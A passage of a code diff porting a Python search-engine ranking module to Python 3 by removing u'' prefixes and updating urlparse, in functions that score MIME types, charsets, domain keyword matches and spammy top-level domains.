-                      u'text/html; Charset=ISO-8859-1', u'text/html; Charset=iso-8859-1', u'text/html; charset=iso8859-1', u'text/html;charset=iso-8859-1',
-                      u'text/html, text/html; charset=iso-8859-1', u'text/html; charset=latin1', u'text/html; charset=',
-                      u'text/html; charset: ISO-8859-1; charset=UTF-8', u'text/html; charset=ISO_8859-1', 'text/html;charset=ascii',
-                      u'text/html; charset=US-ASCII', u'text/html; charset=us-ascii', u'text/html;Charset=ISO-8859-1', 'text/html; charset=UTF-7',
-                      u'text/html; charset=iso-8859-1;', u'text/html; Charset=ISO8859-1', u'text/html; charset=ANSI_X3.4-1968',
-                      u'text/html; charset:iso-8859-1', u'text/html; charset: ISO-8859-1', u'text/html; charset=ISO-8859-1;',
-                      u'text/html; charset=ISO8859-1', u'text/html; charset: iso-8859-1', u'text/html; charset: iso-8859-1; charset=utf-8',
-                      u'text/html; charset=LATIN1', u'text/html; charset=latin-1', u'text/html; UTF-8;charset=ISO-8859-1',
-                      u'text/html; charset=ISO-8859-1, text/html', u'text/html; charset="iso-8859-1"', u'text/html; Charset=windows-28591',
-                      u"text/html; charset='iso-8859-1'", u'text/html; profile=xhtml;charset=ISO-8859-1', u'text/HTML; Charset=ISO-8859-1',
-                      u'text/HTML;charset=ISO-8859-1', u'text/HTML; charset=iso-8859-1', u'text/html; charset=LATIN-1',
-                      u'text/html; charset=charset=iso-8859-1', u'text/html; charset=charset=ISO-8859-1']:
+    elif mimetype in ['text/html', 'text/html;', 'text/html; charset=ISO-8859-1', 'text/html;charset=ISO-8859-1', 'text/html; charset=iso-8859-1',
+                      'text/html; Charset=ISO-8859-1', 'text/html; Charset=iso-8859-1', 'text/html; charset=iso8859-1', 'text/html;charset=iso-8859-1',
+                      'text/html, text/html; charset=iso-8859-1', 'text/html; charset=latin1', 'text/html; charset=',
+                      'text/html; charset: ISO-8859-1; charset=UTF-8', 'text/html; charset=ISO_8859-1', 'text/html;charset=ascii',
+                      'text/html; charset=US-ASCII', 'text/html; charset=us-ascii', 'text/html;Charset=ISO-8859-1', 'text/html; charset=UTF-7',
+                      'text/html; charset=iso-8859-1;', 'text/html; Charset=ISO8859-1', 'text/html; charset=ANSI_X3.4-1968',
+                      'text/html; charset:iso-8859-1', 'text/html; charset: ISO-8859-1', 'text/html; charset=ISO-8859-1;',
+                      'text/html; charset=ISO8859-1', 'text/html; charset: iso-8859-1', 'text/html; charset: iso-8859-1; charset=utf-8',
+                      'text/html; charset=LATIN1', 'text/html; charset=latin-1', 'text/html; UTF-8;charset=ISO-8859-1',
+                      'text/html; charset=ISO-8859-1, text/html', 'text/html; charset="iso-8859-1"', 'text/html; Charset=windows-28591',
+                      "text/html; charset='iso-8859-1'", 'text/html; profile=xhtml;charset=ISO-8859-1', 'text/HTML; Charset=ISO-8859-1',
+                      'text/HTML;charset=ISO-8859-1', 'text/HTML; charset=iso-8859-1', 'text/html; charset=LATIN-1',
+                      'text/html; charset=charset=iso-8859-1', 'text/html; charset=charset=ISO-8859-1']:
         return 0.5
     # Quarter point for ISO-8859-15 or Windows-1252. They're not UTF-8, but they're latin text at least.
-    elif mimetype in [u'text/html; charset=Windows-1252', u'text/html; charset=windows-1252', u'text/html; charset=ISO-8859-15',
-                      u'text/html; charset=iso-8859-15', u'text/html;charset=windows-1252', u'text/html; Charset=windows-1252',
-                      u'text/html;charset=ISO-8859-15', u'text/html; charset= iso-8859-15', u'text/html; charset=WINDOWS-1252',
-                      u'text/html; Charset=ISO-8859-15', u'text/html;charset=iso-8859-15', u'text/html; charset=iso8859-15',
-                      u'text/html, charset=iso-8859-15', u'text/html; charset=iso-8859-15;', u'text/html;charset=Windows-1252',
-                      u'text/html; Charset=Windows-1252', u'text/HTML; Charset=windows-1252', u'text/html; Charset=iso-8859-15',
-                      u'text/html; charset=ISO8859-15', u'text/html; charset="iso-8859-15"', u'text/html;charset=ISO8859-15',
-                      u'text/html; charset="ISO-8859-15"', u'text/html; charset=cp1252']:
+    elif mimetype in ['text/html; charset=Windows-1252', 'text/html; charset=windows-1252', 'text/html; charset=ISO-8859-15',
+                      'text/html; charset=iso-8859-15', 'text/html;charset=windows-1252', 'text/html; Charset=windows-1252',
+                      'text/html;charset=ISO-8859-15', 'text/html; charset= iso-8859-15', 'text/html; charset=WINDOWS-1252',
+                      'text/html; Charset=ISO-8859-15', 'text/html;charset=iso-8859-15', 'text/html; charset=iso8859-15',
+                      'text/html, charset=iso-8859-15', 'text/html; charset=iso-8859-15;', 'text/html;charset=Windows-1252',
+                      'text/html; Charset=Windows-1252', 'text/HTML; Charset=windows-1252', 'text/html; Charset=iso-8859-15',
+                      'text/html; charset=ISO8859-15', 'text/html; charset="iso-8859-15"', 'text/html;charset=ISO8859-15',
+                      'text/html; charset="ISO-8859-15"', 'text/html; charset=cp1252']:
         return 0.25
     # No point modifier for unknown or undeclared charset.
-    elif mimetype in [u'text/html; charset=_CHARSET',]:
+    elif mimetype in ['text/html; charset=_CHARSET', ]:
         return 0.0
     # Lose half a point for plain text. It's not HTML, but it may still be readable. Also lose half a point for text/html with no charset.
-    elif mimetype in [u'text/plain', u'text/plain; charset=UTF-8', u'text/html; charset=none', u'text/plain;charset=ISO-8859-1',
-                      u'text/html; charset=0', u'text/html; charset=NONE', u'text/plain; charset=utf-8', u'text/plain; charset=ISO-8859-1',
-                      u'text/html; charset=None', u'text/plain;charset=UTF-8']:
+    elif mimetype in ['text/plain', 'text/plain; charset=UTF-8', 'text/html; charset=none', 'text/plain;charset=ISO-8859-1',
+                      'text/html; charset=0', 'text/html; charset=NONE', 'text/plain; charset=utf-8', 'text/plain; charset=ISO-8859-1',
+                      'text/html; charset=None', 'text/plain;charset=UTF-8']:
         return -0.5
     # Eastern European encodings ISO-8859-2 and Windows-1250. Lose a point in the English index, gain a quarter point in a few languages
     # just as if it's Windows-1252, otherwise neutral.
-    elif mimetype in [u'text/html; charset=ISO-8859-2', u'text/html; charset=iso-8859-2', u'text/html;charset=WINDOWS-1250',
-                      u'text/html; charset=windows-1250', u'text/html;charset=iso-8859-2', u'text/html; charset=WINDOWS-1250'
-                      u'text/html; ISO8859-2; charset=ISO-8859-2', u'text/html;charset=ISO-8859-2', u'text/html;charset=windows-1250', 
-                      u'text/html; charset=Windows-1250', u'text/html; charset=WINDOWS-1250', u'text/html; charset=cp1250',
-                      u'text/html; Charset=windows-1250', u"text/html; charset='iso-8859-2'", u'text/html; Charset=ISO-8859-2',
-                      u'text/html; charset=iso8859-2', 'text/html; Charset=iso-8859-2', u'text/html; ISO-8859-2; charset=ISO-8859-2',
-                      u'type: text/html; charset=windows-1250;', u'text/html; charset=win-1250', u'text/html; charset=win1250', 
-                      u'text/html; charset= windows-1250', u'text/html; Charset=Windows-1250', u'text/html; charset=iso-8859-2;',
-                      u'text/html; charset=CP-1250', u'text/html; charset=CP1250', u'text/html; charset: ISO-8859-2', u'text/html; charset=ISO8859-2',
-                      u'text/html; charset="iso-8859-2"', u'text/html;  charset=iso-8859-2', u'text/html; charset=latin2', u'text/html; charset=Latin2',
-                      u'text/html;charset=latin2']:
+    elif mimetype in ['text/html; charset=ISO-8859-2', 'text/html; charset=iso-8859-2', 'text/html;charset=WINDOWS-1250',
+                      'text/html; charset=windows-1250', 'text/html;charset=iso-8859-2', 'text/html; charset=WINDOWS-1250'
+                      'text/html; ISO8859-2; charset=ISO-8859-2', 'text/html;charset=ISO-8859-2', 'text/html;charset=windows-1250',
+                      'text/html; charset=Windows-1250', 'text/html; charset=WINDOWS-1250', 'text/html; charset=cp1250',
+                      'text/html; Charset=windows-1250', "text/html; charset='iso-8859-2'", 'text/html; Charset=ISO-8859-2',
+                      'text/html; charset=iso8859-2', 'text/html; Charset=iso-8859-2', 'text/html; ISO-8859-2; charset=ISO-8859-2',
+                      'type: text/html; charset=windows-1250;', 'text/html; charset=win-1250', 'text/html; charset=win1250',
+                      'text/html; charset= windows-1250', 'text/html; Charset=Windows-1250', 'text/html; charset=iso-8859-2;',
+                      'text/html; charset=CP-1250', 'text/html; charset=CP1250', 'text/html; charset: ISO-8859-2', 'text/html; charset=ISO8859-2',
+                      'text/html; charset="iso-8859-2"', 'text/html;  charset=iso-8859-2', 'text/html; charset=latin2', 'text/html; charset=Latin2',
+                      'text/html;charset=latin2']:
         if language == 'en':
             return -1.0
         elif language in ['pl', 'cs', 'sk', 'hu', 'sl', 'hr', 'ro', 'de']:
@@ -860,95 +858,95 @@ def GetMimeTypeModifier(mimetype, language='en', show_unrecognized=True):
         else:
             return 0.0
     # Windows-1257 is for latvian, lithuanian, and estonian, but sometimes used for German and Polish.
-    elif mimetype in [u'text/html; charset=windows-1257',]:
+    elif mimetype in ['text/html; charset=windows-1257', ]:
         if language in ['lt', 'lv', 'et', 'pl', 'de']:
             return 1.0
         else:
             return -1.0
     # ISO-8859-10, Latvian and Lithuanian.
-    elif mimetype in [u'text/html;charset=ISO-8859-13',]:
-        if languagein ['lt', 'lv']:
+    elif mimetype in ['text/html;charset=ISO-8859-13', ]:
+        if language in ['lt', 'lv']:
             return 1.0
         else:
             return -3.0
     # ISO-8859-7 for Greek, as is Windows-28597 and Windows-1253
-    elif mimetype in [u'text/html; charset=iso-8859-7', u'text/html; charset=windows-1253', u'text/html; charset=ISO-8859-7', 
-                      u'text/html; charset=Windows-1253', u'text/html;charset=iso-8859-7', u'text/html; Charset=windows-1253',
-                      u'text/html;charset=windows-1253', u'text/html; Charset=Windows-1253', u'text/html; Charset=ISO-8859-7']:
-        if language in ['el',]:
+    elif mimetype in ['text/html; charset=iso-8859-7', 'text/html; charset=windows-1253', 'text/html; charset=ISO-8859-7',
+                      'text/html; charset=Windows-1253', 'text/html;charset=iso-8859-7', 'text/html; Charset=windows-1253',
+                      'text/html;charset=windows-1253', 'text/html; Charset=Windows-1253', 'text/html; Charset=ISO-8859-7']:
+        if language in ['el', ]:
             return 1.0
         else:
             return -3.0
     # ISO-8859-9 and Windows-1254 and Latin-5 for Turkish
-    elif mimetype in [u'text/html; charset=ISO-8859-9', u'text/html; charset=iso-8859-9', 'text/html; Charset=windows-1254', 
-                      u'text/html; Charset=windows-1254', u'text/html; Charset=Windows-1254', u'text/html; Charset=iso-8859-9',
-                      u'text/html; charset=windows-1254', u'text/html; charset=WINDOWS-1254', u'text/html;Windows-1254',
-                      u'text/HTML; Charset=Windows-1254', u'text/html; charset=8859-9', u'text/html;charset=ISO-8859-9',
-                      u'text/html; charset=Windows-1254', u'text/html; charset=latin5', u'text/HTML; Charset=windows-1254',
-                      u'text/html;charset=iso-8859-9', u'text/HTML; Charset=iso-8859-9', u'text/html; charset=ISO-8859-9;']:
+    elif mimetype in ['text/html; charset=ISO-8859-9', 'text/html; charset=iso-8859-9', 'text/html; Charset=windows-1254',
+                      'text/html; Charset=windows-1254', 'text/html; Charset=Windows-1254', 'text/html; Charset=iso-8859-9',
+                      'text/html; charset=windows-1254', 'text/html; charset=WINDOWS-1254', 'text/html;Windows-1254',
+                      'text/HTML; Charset=Windows-1254', 'text/html; charset=8859-9', 'text/html;charset=ISO-8859-9',
+                      'text/html; charset=Windows-1254', 'text/html; charset=latin5', 'text/HTML; Charset=windows-1254',
+                      'text/html;charset=iso-8859-9', 'text/HTML; Charset=iso-8859-9', 'text/html; charset=ISO-8859-9;']:
         if language == 'tr':
             return 0.5
         else:
             return -1.0
     # Windows-1251 is for Bulgarian, Serbian, Macedonian.
-    elif mimetype in [u'text/html; charset=windows-1251', u'text/html; charset=CP1251', u'text/html; charset=WINDOWS-1251',
-                      u'text/html; charset=windows-1251, text/html', u'text/html;charset=windows-1251', u'text/html; charset=cp1251',
-                      u'text/html; charset=Windows-1251', u'text/html; Charset=windows-1251', u'text/html; charset=cp-1251',
-                      u'text/html; charset=1251']:
+    elif mimetype in ['text/html; charset=windows-1251', 'text/html; charset=CP1251', 'text/html; charset=WINDOWS-1251',
+                      'text/html; charset=windows-1251, text/html', 'text/html;charset=windows-1251', 'text/html; charset=cp1251',
+                      'text/html; charset=Windows-1251', 'text/html; Charset=windows-1251', 'text/html; charset=cp-1251',
+                      'text/html; charset=1251']:
         if language == 'hr' or language == 'si':
             return -1.0
         else:
             return -5.0
     # Windows-1256 is for Arabic. Also commonly used in Franco-Arabic countries (Morocco)
-    elif mimetype in [u'text/html; charset=windows-1256', u'text/html; charset=Windows-1256']:
+    elif mimetype in ['text/html; charset=windows-1256', 'text/html; charset=Windows-1256']:
         if language == 'tr' or language == 'fr':
             return -3.0
         else:
             return -7.0
     # Windows-1255 and ISO-8859-8 are for Hebrew.
-    elif mimetype in [u'text/html; charset=windows-1255',]:
+    elif mimetype in ['text/html; charset=windows-1255', ]:
         return -5.0
     # A diff file. Minor negative, I suppose. Not sure whether these are good or bad.
-    elif mimetype in [u'text/x-diff',]:
+    elif mimetype in ['text/x-diff', ]:
         return -4.0
     # Broken IIS configurations. Not sure how much to adjust.
-    elif mimetype in [u'text/vnd.wap.wml; charset=UTF-8', u'text/vnd.wap.wml']:
+    elif mimetype in ['text/vnd.wap.wml; charset=UTF-8', 'text/vnd.wap.wml']:
         return -6.0
     # Russian scripts: koi8-r
-    elif mimetype in [u'text/html; charset=koi8-r', u'text/html; charset=KOI8-R']:
+    elif mimetype in ['text/html; charset=koi8-r', 'text/html; charset=KOI8-R']:
         return -8.0
     # Thai and Japanese and Korean - EUC-KR, TIS-620, Shift-JIS
-    elif mimetype in [u'text/html; charset=TIS-620', u'text/html; charset=tis-620', u'text/html; charset=EUC-JP', u'text/html; charset=euc-kr',
-                      u'text/html; charset=Shift_JIS', u'text/html; charset=EUC-KR', u'text/html; charset=euc-jp', u'text/html;charset=EUC-KR',
-                      u'text/html; charset=shift_jis', u'text/html;charset=Windows-31J', u'text/html;charset=Shift_JIS',
-                      u'text/html;charset=euc-kr; Charset=euc-kr', u'text/html;charset=euc-kr', u'text/html; charset=SHIFT_JIS',
-                      u'text/html;charset=shift-jis', u'text/html; charset=Shift-jis']:
+    elif mimetype in ['text/html; charset=TIS-620', 'text/html; charset=tis-620', 'text/html; charset=EUC-JP', 'text/html; charset=euc-kr',
+                      'text/html; charset=Shift_JIS', 'text/html; charset=EUC-KR', 'text/html; charset=euc-jp', 'text/html;charset=EUC-KR',
+                      'text/html; charset=shift_jis', 'text/html;charset=Windows-31J', 'text/html;charset=Shift_JIS',
+                      'text/html;charset=euc-kr; Charset=euc-kr', 'text/html;charset=euc-kr', 'text/html; charset=SHIFT_JIS',
+                      'text/html;charset=shift-jis', 'text/html; charset=Shift-jis']:
         return -10.0
     # Chinese
-    elif mimetype in [u'text/html; charset=gbk', u'text/html; charset=gb2312', u'text/html; Charset=gb2312', u'text/html;charset=gbk',
-                      u'text/html; charset=big5', u'text/html; charset=BIG5', u'text/html;charset=GBK', 'text/html; charset=big-5',
-                      u'text/html;charset=Big5-HKSCS', u'text/html;charset=gb2312', u'text/html; Charset=GB2312']:
+    elif mimetype in ['text/html; charset=gbk', 'text/html; charset=gb2312', 'text/html; Charset=gb2312', 'text/html;charset=gbk',
+                      'text/html; charset=big5', 'text/html; charset=BIG5', 'text/html;charset=GBK', 'text/html; charset=big-5',
+                      'text/html;charset=Big5-HKSCS', 'text/html;charset=gb2312', 'text/html; Charset=GB2312']:
         return -15.0
     # Lose ten points for JavaScript. It's technically a bad URL type, but it's also actually text, so IsBadMImeType returns False.
-    elif mimetype in [u'application/javascript', u'application/json', u'application/javascript; charset=utf-8', u'application/json; charset=utf-8', u'text/javascript']:
+    elif mimetype in ['application/javascript', 'application/json', 'application/javascript; charset=utf-8', 'application/json; charset=utf-8', 'text/javascript']:
         return -10.0
     # XML Formats, slightly worse than JavaScript because they're slightly less readable.
-    elif mimetype in [u'application/xml', u'application/rss+xml', u'application/rss+xml; charset=utf-8', u'application/atom+xml; charset=UTF-8',
-                      u'application/rss+xml; charset=UTF-8', u'application/atom+xml; charset=utf-8', u'application/xml;charset=UTF-8',
-                      u'text/xml; charset=UTF-8', u'application/rss+xml;charset=utf-8', u'text/xml; charset="UTF-8"', u'type: text/xml',
-                      u'text/xml; charset=ISO-8859-1', u'application/xhtml+xml; charset=UTF-8', u'text/xml;charset=UTF-8',
-                      u'text/xml; charset=utf-8', u'text/xml;charset=utf-8', u'application/xml; charset=utf-8', u'text/xml;charset=ISO-8859-1',
-                      u'text/html; charset ISO-8859-1; charset=ISO-8859-1', u'text/html; charset=iso-8859-1;', u'text/xml; Charset=utf-8',
-                      u'text/xml', u'application/atom+xml;charset=UTF-8', u'application/atom+xml; charset=ISO-8859-1' u'application/xml; charset=UTF-8',
-                      u'application/xml; charset=ISO-8859-1', u'application/rss+xml; charset: utf-8', u'text/xml; charset=windows-1250',
-                      u'application/xml; charset=UTF-8', u'application/rss+xml; charset=utf8', u'application/xml; charset=windows-1252',
-                      u'text/xml; charset=windows-1251', u'application/atom+xml', u'application/xml;', u'application/rss+xml; charset=UTF-8;',
-                      u'application/rss+xml;', u'application/atom+xml; charset=iso-8859-1', u'text/xml;charset=iso-8859-1', 
-                      u'application/rss+xml; charset=ISO-8859-1', u'text/xml;charset=iso-8859-1', u'text/html;charset=iso-8859-1;',
-                      u'application/rss+xml; charset=iso-8859-1', u'text/xml;', u'text/xml; charset=tis-620', u'text/xml; charset=ISO-8859-15',
-                      u'text/html; Charset=ISO-8859-9', u'text/xml; charset=windows-1254', u'text/xml; charset=Windows-1254', 
-                      u'text/xml; charset=WINDOWS-1254', u'text/xml;charset=iso-8859-2', u'text/xml; charset=ISO-8859-9',
-                      u'text/xml; charset=utf8']:
+    elif mimetype in ['application/xml', 'application/rss+xml', 'application/rss+xml; charset=utf-8', 'application/atom+xml; charset=UTF-8',
+                      'application/rss+xml; charset=UTF-8', 'application/atom+xml; charset=utf-8', 'application/xml;charset=UTF-8',
+                      'text/xml; charset=UTF-8', 'application/rss+xml;charset=utf-8', 'text/xml; charset="UTF-8"', 'type: text/xml',
+                      'text/xml; charset=ISO-8859-1', 'application/xhtml+xml; charset=UTF-8', 'text/xml;charset=UTF-8',
+                      'text/xml; charset=utf-8', 'text/xml;charset=utf-8', 'application/xml; charset=utf-8', 'text/xml;charset=ISO-8859-1',
+                      'text/html; charset ISO-8859-1; charset=ISO-8859-1', 'text/html; charset=iso-8859-1;', 'text/xml; Charset=utf-8',
+                      'text/xml', 'application/atom+xml;charset=UTF-8', 'application/atom+xml; charset=ISO-8859-1' 'application/xml; charset=UTF-8',
+                      'application/xml; charset=ISO-8859-1', 'application/rss+xml; charset: utf-8', 'text/xml; charset=windows-1250',
+                      'application/xml; charset=UTF-8', 'application/rss+xml; charset=utf8', 'application/xml; charset=windows-1252',
+                      'text/xml; charset=windows-1251', 'application/atom+xml', 'application/xml;', 'application/rss+xml; charset=UTF-8;',
+                      'application/rss+xml;', 'application/atom+xml; charset=iso-8859-1', 'text/xml;charset=iso-8859-1',
+                      'application/rss+xml; charset=ISO-8859-1', 'text/xml;charset=iso-8859-1', 'text/html;charset=iso-8859-1;',
+                      'application/rss+xml; charset=iso-8859-1', 'text/xml;', 'text/xml; charset=tis-620', 'text/xml; charset=ISO-8859-15',
+                      'text/html; Charset=ISO-8859-9', 'text/xml; charset=windows-1254', 'text/xml; charset=Windows-1254',
+                      'text/xml; charset=WINDOWS-1254', 'text/xml;charset=iso-8859-2', 'text/xml; charset=ISO-8859-9',
+                      'text/xml; charset=utf8']:
         return -12.0
     # Unreadable/unsaved file types
     elif IsBadMimeType(mimetype):
@@ -956,7 +954,7 @@ def GetMimeTypeModifier(mimetype, language='en', show_unrecognized=True):
     else:
         # Lose half a point for unrecognized MIME types, same as plain text.
         if verbose:
-            print(u'Unrecognized MIME type: {0}'.format(mimetype))
+            print('Unrecognized MIME type: {0}'.format(mimetype))
         return -0.5
 
 def CalculateTermValue(item, keywords, abbreviated=False, lang=None, verbose=False):
@@ -993,25 +991,25 @@ def CalculateTermValue(item, keywords, abbreviated=False, lang=None, verbose=Fal
     # Most points for exact match, then second most points for exact match without domain extension,
     # then high points for keywords in domain, then points for keywords anywhere in the domain.
     if item.rooturl:
-        spliturl = item.rooturl.split(u'.')
+        spliturl = item.rooturl.split('.')
         # Penalty for being excessively subdomained. Lose 4 points for domain.site.com, and 4 more
         # for each subdomain beyond that.
         numsub = len(spliturl)
-        if numsub > 2 and spliturl[0] == u'www':
+        if numsub > 2 and spliturl[0] == 'www':
             numsub -= 1
         if numsub > 2:
-            value -= (numsub-2) * 4
+            value -= (numsub - 2) * 4
             if verbose:
-                rulematches.append('-{0} points for having more than 2 subdomains.'.format((numsub-2)*4))
+                rulematches.append('-{0} points for having more than 2 subdomains.'.format((numsub - 2) * 4))
     # Exact url match, matches "cheese.com" when the URL is "cheese.com".
     if item.rooturl and asciikeywords == item.rooturl.lower():
         keywordisdomain = True
         value += 50
         if verbose:
-            rulematches.append('50 points for exact domain match.'.format((numsub-2)*4))
+            rulematches.append('50 points for exact domain match.')
     # Matches "cheese.com" when the URL is cheese.com
-    elif item.rooturl and u'.' in asciikeywords and asciikeywords in item.rooturl and len(spliturl) > 1:
-        splitk = asciikeywords.split(u'.')
+    elif item.rooturl and '.' in asciikeywords and asciikeywords in item.rooturl and len(spliturl) > 1:
+        splitk = asciikeywords.split('.')
         # Exact match of "cheese.com" and "cheese.com".
         if len(spliturl) == 2 and splitk[0] == spliturl[0] and splitk[1] == spliturl[1]:
             value += 48
@@ -1023,8 +1021,8 @@ def CalculateTermValue(item, keywords, abbreviated=False, lang=None, verbose=Fal
             if verbose:
                 rulematches.append('34 points for subdomain match.')
             # Bonus points for exact match (being root). Matches http://www.cheese.com for "yahoo.com" keywords.
-            if ((u'http://www.' + asciikeywords) == item.url or (u'http://www.' + asciikeywords) == (item.url + u'/') or
-                (u'https://www.' + asciikeywords) == item.url or (u'https://www.' + asciikeywords) == (item.url + u'/')):
+            if (('http://www.' + asciikeywords) == item.url or ('http://www.' + asciikeywords) == (item.url + '/') or
+                ('https://www.' + asciikeywords) == item.url or ('https://www.' + asciikeywords) == (item.url + '/')):
                 value += 12
                 if verbose:
                     rulematches.append('12 points for domain match with www prefix.')
@@ -1041,35 +1039,35 @@ def CalculateTermValue(item, keywords, abbreviated=False, lang=None, verbose=Fal
             rulematches.append('32 points for keyword is domain match.')
         # Exact match .com with 'www' prefix - in this case we give extra bonus for domain extension.
         # Largest bonus for .com, then other reputable domain extensions.
-        if spliturl[1] == u'com':
+        if spliturl[1] == 'com':
             value += 10
             if verbose:
                 rulematches.append('10 points for .com domain match.')
-        elif spliturl[1] == u'.co.uk' or spliturl[1] == u'.gov' or spliturl[1] == u'.edu':
+        elif spliturl[1] == '.co.uk' or spliturl[1] == '.gov' or spliturl[1] == '.edu':
             value += 6
             if verbose:
                 rulematches.append('6 points for .co.uk/.gov/.edu domain match.')
-        elif spliturl[1] == u'.org' or spliturl[1] == u'.net' or spliturl[1] == u'.au' or spliturl[1] == u'.mil' or spliturl[1] == u'.ca':
+        elif spliturl[1] == '.org' or spliturl[1] == '.net' or spliturl[1] == '.au' or spliturl[1] == '.mil' or spliturl[1] == '.ca':
             value += 4
             if verbose:
                 rulematches.append('4 points for .net/.org/.au/.mil/.ca domain match.')
     # Matches "cheese" when the URL is www.cheese.com.
-    elif item.rooturl and item.rooturl.startswith(u'www.') and len(spliturl) == 3 and spliturl[1] == asciikeywords:
+    elif item.rooturl and item.rooturl.startswith('www.') and len(spliturl) == 3 and spliturl[1] == asciikeywords:
         keywordisdomain = True
         value += 30
         if verbose:
             rulematches.append('30 points for www domain keyword match.')
         # Exact match .com with 'www' prefix - in this case we give extra bonus for domain extension.
         # Largest bonus for .com, then other reputable domain extensions.
-        if spliturl[2] == u'com':
+        if spliturl[2] == 'com':
             value += 10
             if verbose:
                 rulematches.append('10 points for .com domain match.')
-        elif spliturl[2] == u'.co.uk' or spliturl[2] == u'.gov' or spliturl[2] == u'.edu':
+        elif spliturl[2] == '.co.uk' or spliturl[2] == '.gov' or spliturl[2] == '.edu':
             value += 6
             if verbose:
                 rulematches.append('6 points for .co.uk/.gov/.edu domain match.')
-        elif spliturl[2] == u'.org' or spliturl[2] == u'.net' or spliturl[2] == u'.au' or spliturl[2] == u'.mil' or spliturl[2] == u'.ca':
+        elif spliturl[2] == '.org' or spliturl[2] == '.net' or spliturl[2] == '.au' or spliturl[2] == '.mil' or spliturl[2] == '.ca':
             value += 4
             if verbose:
                 rulematches.append('4 points for .net/.org/.au/.mil/.ca domain match.')
@@ -1080,7 +1078,7 @@ def CalculateTermValue(item, keywords, abbreviated=False, lang=None, verbose=Fal
         if verbose:
             rulematches.append('30 points for two word domain match in order.')
     # Matches "cheese sandwich" when the URL is www.cheesesandwich.com. Also matches cheese.sandwich.
-    elif multiword and item.rooturl and item.rooturl.startswith(u'www.') and len(spliturl) == 3 and spliturl[1] == spacelessasciikeywords:
+    elif multiword and item.rooturl and item.rooturl.startswith('www.') and len(spliturl) == 3 and spliturl[1] == spacelessasciikeywords:
         keywordisdomain = True
         value += 24
         if verbose:
@@ -1091,7 +1089,7 @@ def CalculateTermValue(item, keywords, abbreviated=False, lang=None, verbose=Fal
         if verbose:
             rulematches.append('20 points for partial domain word match.')
     # Matches "cheese" when the URL is www.cheeseburger.com.
-    elif item.rooturl and item.rooturl.startswith(u'www.') and len(spliturl) > 1 and asciikeywords in spliturl[1]:
+    elif item.rooturl and item.rooturl.startswith('www.') and len(spliturl) > 1 and asciikeywords in spliturl[1]:
         value += 18
         if verbose:
             rulematches.append('18 points for www partial domain word match.')
@@ -1101,7 +1099,7 @@ def CalculateTermValue(item, keywords, abbreviated=False, lang=None, verbose=Fal
         if verbose:
             rulematches.append('16 points for partial domain multi word match.')
     # Matches "cheese sandwich" when the URL is www.cheesesandwichforsale.com.
-    elif multiword and item.rooturl and item.rooturl.startswith(u'www.') and len(spliturl) > 1 and spacelessasciikeywords in spliturl[1]:
+    elif multiword and item.rooturl and item.rooturl.startswith('www.') and len(spliturl) > 1 and spacelessasciikeywords in spliturl[1]:
         value += 14
         if verbose:
             rulematches.append('14 points for partial www domain multi word match.')
@@ -1129,7 +1127,7 @@ def CalculateTermValue(item, keywords, abbreviated=False, lang=None, verbose=Fal
         if numwordsfound:
             value += (20.0 * numwordsfound) / len(splitkeywords)
             if verbose:
-                rulematches.append('{0} points for matching {1} of {2} keywords.'.format((20*numwordsfound)/len(splitkeywords), numwordsfound, len(splitkeywords)))
+                rulematches.append('{0} points for matching {1} of {2} keywords.'.format((20 * numwordsfound) / len(splitkeywords), numwordsfound, len(splitkeywords)))
     # If this is the root URL for the site, add a few points.
     if (item.rooturl and (item.url == item.rooturl) or (item.url == ('http://' + item.rooturl)) or
        (item.url == ('https://' + item.rooturl)) or (item.url == ('http://' + item.rooturl + '/')) or
@@ -1158,11 +1156,11 @@ def CalculateTermValue(item, keywords, abbreviated=False, lang=None, verbose=Fal
         if verbose:
             rulematches.append('-2 points for comma in url.')
     if len(underscores) > 1:
-        value -= (2 * (len(underscores) -1))
+        value -= (2 * (len(underscores) - 1))
         if verbose:
-            rulematches.append('-{0} points for underscores in url.'.format((2*(len(underscores)-1))))
+            rulematches.append('-{0} points for underscores in url.'.format((2 * (len(underscores) - 1))))
     # Lose a point for having query parameters. site.com/page.php?q=222 one point lower than site.com/page.php
-    parsed = urlparse.urlparse(item.url)
+    parsed = urllib.parse.urlparse(item.url)
     if parsed.query:
         value -= 1
         if verbose:
@@ -1186,26 +1184,26 @@ def CalculateTermValue(item, keywords, abbreviated=False, lang=None, verbose=Fal
             rulematches.append('1 point for keywords in the query.')
     # Domain points. Lose points for generally spammy domains, add for common top-level domains,
     # and no adjustment for things like .us or .co.uk.
-    if item.rooturl.endswith(u'.xxx') or item.rooturl.endswith(u'.porn'):
+    if item.rooturl.endswith('.xxx') or item.rooturl.endswith('.porn'):
         # Rank these last in almost all cases.
         value -= 50
         if verbose:
             rulematches.append('-50 points for root domain .xxx/.porn.')
-    elif item.rooturl.endswith(u'.pics') or item.rooturl.endswith(u'.sexy') or item.rooturl.endswith(u'.adult') or item.rooturl.endswith(u'.pictures'):
+    elif item.rooturl.endswith('.pics') or item.rooturl.endswith('.sexy') or item.rooturl.endswith('.adult') or item.rooturl.endswith('.pictures'):
         value -= 10
         if verbose:
             rulematches.append('-10 points for root domain .pics/.sexy/.adult/.pictures.')
     # These new TLDs are pretty much always spam and malware.
-    elif item.rooturl.endswith(u'.xyz') or item.rooturl.endswith(u'.kim') or item.rooturl.endswith(u'.review') or item.rooturl.endswith(u'.cricket') or item.rooturl.endswith(u'.science') or item.rooturl.endswith(u'.country') or item.rooturl.endswith(u'.party') or item.rooturl.endswith(u'.work') or item.rooturl.endswith(u'.link') or item.rooturl.endswith(u'.gq') or item.rooturl.endswith(u'.fun'):
+    elif item.rooturl.endswith('.xyz') or item.rooturl.endswith('.kim') or item.rooturl.endswith('.review') or item.rooturl.endswith('.cricket') or item.rooturl.endswith('.science') or item.rooturl.endswith('.country') or item.rooturl.endswith('.party') or item.rooturl.endswith('.work') or item.rooturl.endswith('.link') or item.rooturl.endswith('.gq') or item.rooturl.endswith('.fun'):
         value -= 8
         if verbose:
             rulematches.append('-8 points for root domain .xyz/.kim/.review/.cricket/.link/.science/.work/.gq/.party/.country/.fun')
-    elif item.rooturl.endswith(u'.info') or item.rooturl.endswith(u'.cn') or item.rooturl.endswith(u'.ru') or item.rooturl.endswith(u'.su') or item.rooturl.endswith(u'.biz') or item.rooturl.endswith(u'.mobi') or item.rooturl.endswith(u'.icu'):
+    elif item.rooturl.endswith('.info') or item.rooturl.endswith('.cn') or item.rooturl.endswith('.ru') or item.rooturl.endswith('.su') or item.rooturl.endswith('.biz') or item.rooturl.endswith('.mobi') or item.rooturl.endswith('.icu'):
         value -= 6
         if verbose:
